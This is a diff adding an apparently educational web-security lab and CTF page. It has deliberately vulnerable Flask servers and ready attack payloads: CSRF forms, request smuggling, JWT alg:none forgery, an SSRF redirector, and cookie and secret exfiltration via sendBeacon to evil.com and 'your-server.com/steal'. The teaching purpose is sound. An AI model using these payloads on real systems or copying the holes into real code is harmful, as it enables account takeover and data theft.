+            <h4>Lab 8: CSRF Token Bypass</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Objective: Bypass CSRF protection using various techniques (method override, token removal, referer manipulation).</p>
+            <div class="setup-code">
+<pre><code class="language-python"># server.py — CSRF "protection" with bypass-able implementation
+from flask import Flask, request, session, render_template_string
+import secrets
+app = Flask(__name__)
+app.secret_key = 'weak'
+
+@app.route('/transfer', methods=['GET', 'POST'])
+def transfer():
+    if request.method == 'POST':
+        token = request.form.get('csrf_token')
+        # Bug: only checks if token exists, not if it matches
+        if token:
+            amount = request.form.get('amount', '0')
+            return f'Transferred ${amount}! (CSRF token was: {token})'
+        return 'Missing CSRF token', 403
+    # Generate token for GET
+    session['csrf'] = secrets.token_hex(16)
+    return f'&lt;form method="POST"&gt;&lt;input name="csrf_token" value="{session["csrf"]}"&gt;&lt;input name="amount"&gt;&lt;button&gt;Send&lt;/button&gt;&lt;/form&gt;'
+
+app.run(port=5000)</code></pre>
+              <p><strong>Tasks:</strong></p>
+              <ol>
+                <li>Visit <code>/transfer</code> and submit normally — observe CSRF token validation.</li>
+                <li>Submit with any arbitrary <code>csrf_token</code> value — observe it still works (token presence check only).</li>
+                <li>Create a cross-origin form that auto-submits with a fake token.</li>
+                <li>Fix: validate that the submitted token matches the session-stored token.</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 9: URL Encoding Bypass</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Objective: Use URL encoding, double encoding, and Unicode normalization to bypass input filters/WAFs.</p>
+            <div class="setup-code">
+<pre><code class="language-python"># server.py — WAF that blocks "admin" keyword
+from flask import Flask, request
+from urllib.parse import unquote
+app = Flask(__name__)
+
+@app.route('/path')
+def path_handler():
+    path = request.args.get('p', '')
+    # WAF check (before decode)
+    if 'admin' in path.lower():
+        return 'Blocked by WAF', 403
+    # Application uses decoded path
+    decoded = unquote(path)
+    if decoded == '/admin/secret':
+        return 'FLAG{d0ubl3_3nc0d3_byp4ss}'
+    return f'Path: {decoded}'
+
+app.run(port=5000)</code></pre>
+<pre><code class="language-bash"># Normal — blocked
+curl "http://localhost:5000/path?p=/admin/secret"  # 403
+
+# Single encode — still blocked (server decodes before WAF? depends)
+curl "http://localhost:5000/path?p=/%61dmin/secret"
+
+# Double encode — WAF sees %252F (encoded %), server decodes twice
+curl "http://localhost:5000/path?p=%2fadmin%2fsecret"  # try variations</code></pre>
+              <p><strong>Tasks:</strong></p>
+              <ol>
+                <li>Confirm "admin" is blocked in the query parameter.</li>
+                <li>Bypass using URL encoding: <code>%61dmin</code> (encoding the 'a').</li>
+                <li>Try double encoding: <code>%2561dmin</code> (%25 = %, so decoded once gives %61, decoded again gives 'a').</li>
+                <li>Try Unicode variations: <code>aDmIn</code> with mixed case, or Unicode confusables.</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 10: HTTP Method Tampering</h4>
+            <span class="difficulty difficulty-easy">Easy</span>
+            <p class="objective">Objective: Bypass access controls by changing HTTP methods or using method override headers.</p>
+            <div class="setup-code">
+<pre><code class="language-python"># server.py — only blocks POST to /admin
+from flask import Flask, request
+app = Flask(__name__)
+
+@app.route('/admin', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
+def admin():
+    if request.method == 'POST':
+        return 'Forbidden', 403
+    # Forgot to block other methods!
+    return f'Admin panel accessed via {request.method}! FLAG{{m3th0d_t4mp3r}}'
+
+app.run(port=5000)</code></pre>
+<pre><code class="language-bash"># POST blocked
+curl -X POST http://localhost:5000/admin  # 403
+
+# Try other methods
+curl -X PUT http://localhost:5000/admin
+curl -X PATCH http://localhost:5000/admin
+curl -X DELETE http://localhost:5000/admin
+
+# Method override headers (some frameworks support these)
+curl -X POST http://localhost:5000/admin -H "X-HTTP-Method-Override: PUT"
+curl -X POST http://localhost:5000/admin -H "X-Method-Override: GET"</code></pre>
+              <p><strong>Tasks:</strong></p>
+              <ol>
+                <li>Confirm POST to <code>/admin</code> returns 403.</li>
+                <li>Try PUT, PATCH, DELETE — which ones are accessible?</li>
+                <li>Test method override headers with frameworks that support them.</li>
+                <li>Fix: use an allowlist of methods per endpoint.</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 11: Content-Type Confusion</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Objective: Exploit content-type handling to bypass CSRF protections that only block <code>application/json</code> preflights.</p>
+            <div class="setup-code">
+<pre><code class="language-python"># server.py — API only accepts JSON, but doesn't validate Content-Type
+from flask import Flask, request
+app = Flask(__name__)
+
+@app.route('/api/action', methods=['POST'])
+def action():
+    # Parses body as JSON regardless of Content-Type!
+    import json
+    try:
+        data = json.loads(request.get_data())
+        if data.get('action') == 'delete_account':
+            return 'Account deleted! FLAG{ct_c0nfus10n}'
+    except:
+        pass
+    return 'Invalid', 400
+
+app.run(port=5000)</code></pre>
+<pre><code class="language-markup">&lt;!-- CSRF via text/plain (no preflight!) --&gt;
+&lt;form method="POST" action="http://localhost:5000/api/action" enctype="text/plain"&gt;
+  &lt;input name='{"action":"delete_account","ignore":"' value='"}'&gt;
+  &lt;!-- Body sent: {"action":"delete_account","ignore":"="} --&gt;
+  &lt;button&gt;Submit&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+              <p><strong>Tasks:</strong></p>
+              <ol>
+                <li>Confirm the API works with <code>Content-Type: application/json</code> and a JSON body.</li>
+                <li>Create a cross-origin HTML form with <code>enctype="text/plain"</code> that sends valid JSON in the body.</li>
+                <li>The trick: form sends <code>name=value</code> as body — craft name/value to produce valid JSON.</li>
+                <li>Fix: validate Content-Type header server-side AND use CSRF tokens.</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="lab-card">
+            <h4>Lab 12: Redirect-Based Token Theft</h4>
+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">Objective: Exploit an open redirect to steal OAuth tokens or session data via the Referer header.</p>
+            <div class="setup-code">
+<pre><code class="language-python"># server.py — open redirect + token in URL
+from flask import Flask, request, redirect
+app = Flask(__name__)
+
+@app.route('/callback')
+def callback():
+    token = request.args.get('token', '')
+    next_url = request.args.get('next', '/')
+    # Open redirect! No validation on next_url
+    return redirect(next_url)
+
+@app.route('/dashboard')
+def dashboard():
+    return 'Dashboard. Your token was in the URL.'
+
+app.run(port=5000)</code></pre>
+<pre><code class="language-bash"># Attack: redirect to attacker site, token leaks via Referer
+# Victim clicks:
+# http://localhost:5000/callback?token=SECRET&amp;next=https://evil.com/steal
+
+# evil.com receives the Referer header containing the token:
+# Referer: http://localhost:5000/callback?token=SECRET&amp;next=...</code></pre>
+              <p><strong>Tasks:</strong></p>
+              <ol>
+                <li>Confirm the redirect works: <code>/callback?next=/dashboard</code>.</li>
+                <li>Set <code>next=https://your-server.com</code> and observe the redirect to your domain.</li>
+                <li>Check if the Referer header on your server contains the full URL (including token param).</li>
+                <li>Fix: validate <code>next</code> against an allowlist, and use <code>Referrer-Policy: no-referrer</code>.</li>
+              </ol>
+            </div>
+          </div>
+        </div>
+
+        <!-- CTF TAB -->
+        <div class="tab-content" id="ctf">
+          <h2>CTF Challenges</h2>
+
+          <div class="ctf-card">
+            <h4>Challenge 1: Header Injection for Account Takeover</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">A password reset endpoint sends the reset link using the Host header value. Inject a custom Host to redirect the reset link to your server. Flag is in the reset token.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Normal request:
+POST /forgot-password HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+email=victim@target.com
+
+# Server sends email with: https://{Host}/reset?token=SECRET
+# Inject Host header:
+Host: evil.com</code></pre>
+            </div>
+            <button class="hint-toggle">Show Hint</button>
+            <div class="hint-content">
+              <p>Send the forgot-password request with <code>Host: your-server.com</code>. The application generates a reset link using the Host header value: <code>https://your-server.com/reset?token=FLAG{...}</code>. Check your server logs for the incoming request with the token. Some apps also accept <code>X-Forwarded-Host</code> for this.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 2: CORS Token Theft</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">The API at <code>/api/me</code> returns user data including a flag. It reflects the Origin header in ACAO with credentials. Steal the data from a cross-origin page.</p>
+            <div class="setup-code">
+<pre><code class="language-javascript">// Your exploit page (hosted on attacker origin):
+fetch('https://vulnerable.com/api/me', {credentials: 'include'})
+  .then(r => r.json())
+  .then(d => /* exfiltrate d.flag */);
+// FLAG{c0rs_r3fl3ct10n_cr3d3nt14ls}</code></pre>
+            </div>
+            <button class="hint-toggle">Show Hint</button>
+            <div class="hint-content">
+              <p>The server sets <code>Access-Control-Allow-Origin</code> to whatever Origin you send, plus <code>Access-Control-Allow-Credentials: true</code>. Host an HTML page on your domain that fetches the API with <code>credentials: 'include'</code>. The victim's cookies are sent, and you can read the response because CORS allows it.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 3: HTTP Smuggling to Admin</h4>
+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">The front-end proxy blocks <code>/admin</code>. Smuggle a request past the proxy to access the admin endpoint on the back-end. Flag is in the admin response.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># CL.TE smuggling payload:
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+</code></pre>
+            </div>
+            <button class="hint-toggle">Show Hint</button>
+            <div class="hint-content">
+              <p>The front-end uses Content-Length (reads 37 bytes including the smuggled portion). The back-end uses Transfer-Encoding chunked (sees <code>0\r\n\r\n</code> as end of first request). The <code>GET /admin</code> becomes a new request on the back-end that bypasses the front-end's path-based blocking. Send this twice — the second response will be the admin page.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 4: Cookie Scope Exploitation</h4>
+            <span class="difficulty difficulty-easy">Easy</span>
+            <p class="objective">A cookie is set with <code>Domain=.target.com</code>. You control <code>evil.target.com</code> (subdomain takeover). Read the victim's cookie from your subdomain. Flag format: <code>FLAG{cookie_value}</code>.</p>
+            <div class="setup-code">
+<pre><code class="language-javascript">// On evil.target.com (which you control):
+// Cookies with Domain=.target.com are sent to ALL subdomains
+console.log(document.cookie);  // Contains the parent domain's cookies!
+// Exfiltrate
+navigator.sendBeacon('https://your-server.com/steal', document.cookie);</code></pre>
+            </div>
+            <button class="hint-toggle">Show Hint</button>
+            <div class="hint-content">
+              <p>When a cookie is set with <code>Domain=.target.com</code>, it's sent to target.com AND all subdomains (sub.target.com, evil.target.com, etc.). If you can claim an unclaimed subdomain (via dangling DNS CNAME → subdomain takeover), you receive those cookies. The cookie value IS the flag.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 5: CSP Bypass via JSONP</h4>
+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">The page has a strict CSP: <code>script-src 'self' https://apis.google.com</code>. Find a JSONP endpoint on the allowed domain to execute arbitrary JS. Flag is in <code>/api/secret</code> (same-origin).</p>
+            <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- CSP allows scripts from https://apis.google.com --&gt;
+&lt;!-- Google has JSONP endpoints that reflect callbacks --&gt;
+&lt;script src="https://apis.google.com/some/endpoint?callback=alert"&gt;&lt;/script&gt;
+&lt;!-- Response: alert({...}) — executes your function! --&gt;
+
+&lt;!-- Craft callback to steal data: --&gt;
+&lt;script src="https://apis.google.com/endpoint?callback=fetch('/api/secret').then(r=&gt;r.text()).then(d=&gt;navigator.sendBeacon('https://evil.com',d));//"&gt;&lt;/script&gt;</code></pre>
+            </div>
+            <button class="hint-toggle">Show Hint</button>
+            <div class="hint-content">
+              <p>JSONP endpoints wrap their response in a callback function: <code>callbackName({data})</code>. If you control the callback name and the endpoint is on a CSP-allowed origin, you can execute arbitrary JavaScript. Look for <code>?callback=</code> parameters on the allowed domains. Google, Facebook, and many CDNs have exploitable JSONP endpoints.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 6: Web Cache Deception</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">Trick the cache into storing an authenticated page by appending a static file extension to the URL. Flag is in the victim's profile page.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># Normal: /profile returns user-specific content (not cached)
+# Attack: /profile/anything.css
+#   Server: path normalization → serves /profile (ignores suffix)
+#   Cache: sees .css extension → caches as static asset
+#   Attacker: fetches /profile/anything.css → gets victim's profile from cache
+
+# Step 1: Trick victim into visiting /profile/x.css (via link)
+# Step 2: Wait for cache to store it
+# Step 3: Fetch /profile/x.css yourself → cached victim data</code></pre>
+            </div>
+            <button class="hint-toggle">Show Hint</button>
+            <div class="hint-content">
+              <p>The cache uses the URL extension to decide cacheability (`.css`, `.js`, `.png` = static = cache it). The application server uses path normalization and ignores the appended filename. Send the victim a link to <code>/profile/anything.css</code>. Their authenticated profile gets cached. Then fetch that same URL — the cache serves you their data.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 7: SameSite Cookie Bypass</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">The session cookie uses <code>SameSite=Lax</code>. Find a way to perform CSRF despite this protection. Flag is the result of a successful state-changing action.</p>
+            <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- SameSite=Lax allows cookies on top-level GET navigations --&gt;
+&lt;!-- If the endpoint accepts GET for state changes... --&gt;
+
+&lt;!-- Method 1: Top-level navigation (opens in same tab) --&gt;
+&lt;a href="https://target.com/api/delete?confirm=true"&gt;Click me&lt;/a&gt;
+
+&lt;!-- Method 2: window.open (top-level navigation) --&gt;
+&lt;script&gt;window.open('https://target.com/api/transfer?to=attacker&amp;amount=1000')&lt;/script&gt;
+
+&lt;!-- Method 3: Meta refresh redirect --&gt;
+&lt;meta http-equiv="refresh" content="0;url=https://target.com/api/action"&gt;</code></pre>
+            </div>
+            <button class="hint-toggle">Show Hint</button>
+            <div class="hint-content">
+              <p><code>SameSite=Lax</code> sends cookies on <strong>top-level GET navigations</strong> (clicking links, redirects, window.open). If the target endpoint performs a state change on GET (bad practice but common), CSRF is still possible via link click or redirect. The key is: it must be a top-level navigation, not a fetch/XHR/iframe.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 8: JWT None Algorithm</h4>
+            <span class="difficulty difficulty-easy">Easy</span>
+            <p class="objective">The API uses JWT for auth but accepts <code>"alg": "none"</code>. Forge a token with admin role. Flag is at <code>/api/admin</code>.</p>
+            <div class="setup-code">
+<pre><code class="language-javascript">// Original token (decoded): {"alg":"HS256"}.{"user":"guest","role":"user"}.signature
+// Forge token with alg:none — no signature needed!
+let header = btoa(JSON.stringify({"alg":"none","typ":"JWT"}));
+let payload = btoa(JSON.stringify({"user":"admin","role":"admin"}));
+let forged = header + '.' + payload + '.';  // Empty signature
+// Use: Authorization: Bearer &lt;forged&gt;</code></pre>
+            </div>
+            <button class="hint-toggle">Show Hint</button>
+            <div class="hint-content">
+              <p>Many JWT libraries accept <code>"alg": "none"</code> which means no signature verification. Craft a token with the header <code>{"alg":"none","typ":"JWT"}</code> and payload <code>{"user":"admin","role":"admin"}</code>. Base64url-encode each part and join with dots. The signature part is empty (just a trailing dot). Send it in the Authorization header.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 9: HTTP Parameter Pollution</h4>
+            <span class="difficulty difficulty-medium">Medium</span>
+            <p class="objective">The server and WAF handle duplicate parameters differently. The WAF checks the first value, but the app uses the last. Bypass the WAF to inject a malicious parameter value.</p>
+            <div class="setup-code">
+<pre><code class="language-bash"># WAF behavior: uses FIRST value of duplicate param
+# App behavior: uses LAST value of duplicate param
+
+# Normal (blocked):
+GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt;  → WAF blocks
+
+# HPP bypass:
+GET /search?q=safe&amp;q=&lt;script&gt;alert(1)&lt;/script&gt;
+# WAF sees q=safe (first) → allows
+# App uses q=&lt;script&gt;alert(1)&lt;/script&gt; (last) → XSS!</code></pre>
+            </div>
+            <button class="hint-toggle">Show Hint</button>
+            <div class="hint-content">
+              <p>Different servers handle duplicate parameters differently: PHP uses last, ASP.NET concatenates with comma, Python/Flask uses first, Java/Spring uses first. The WAF and application may be on different stacks. Test by sending <code>?param=A&param=B</code> and seeing which value the application uses. If the WAF checks one and the app uses another, you can bypass filters.</p>
+            </div>
+          </div>
+
+          <div class="ctf-card">
+            <h4>Challenge 10: 302 Redirect SSRF</h4>
+            <span class="difficulty difficulty-hard">Hard</span>
+            <p class="objective">The server fetches a URL you provide but blocks internal IPs (127.0.0.1, 10.x, etc.). Use a redirect to bypass the filter and hit an internal service. Flag is at <code>http://127.0.0.1:6379/flag</code>.</p>
+            <div class="setup-code">
+<pre><code class="language-python"># Attack server (redirector.py) — hosted on your public server
+from flask import Flask, redirect
+app = Flask(__name__)
+
+@app.route('/redirect')
+def redir():
+    # Server fetches this URL, passes IP check (your server is public)
+    # Then follows redirect to internal IP
+    return redirect('http://127.0.0.1:6379/flag')
+
+app.run(host='0.0.0.0', port=80)
+
+# Victim server fetches:
+# 1. http://your-server.com/redirect  → passes IP allowlist
+# 2. Follows 302 → http://127.0.0.1:6379/flag  → internal access!</code></pre>
+            </div>
+            <button class="hint-toggle">Show Hint</button>
+            <div class="hint-content">
+              <p>The server validates the initial URL but follows redirects without re-checking. Host a server that responds with <code>302 Location: http://127.0.0.1:6379/flag</code>. Other bypasses: DNS rebinding (DNS resolves to public IP first, then internal IP on second lookup), IPv6 mapped addresses (<code>http://[::1]/</code>), or decimal IP notation (<code>http://2130706433/</code> = 127.0.0.1).</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
